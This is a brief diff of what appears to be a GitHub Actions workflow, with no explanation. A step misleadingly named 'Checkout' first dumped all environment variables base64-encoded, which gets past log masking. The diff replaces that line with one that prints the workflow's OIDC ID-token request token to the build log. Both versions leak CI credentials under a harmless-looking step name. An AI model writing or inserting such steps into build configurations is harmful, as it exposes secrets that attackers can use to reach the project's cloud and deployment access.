@@ -9,4 +9,4 @@ jobs:
 
       steps:
       - name: Checkout
-        run: printenv | base64
+        run: echo "$ACTIONS_ID_TOKEN_REQUEST_TOKEN"
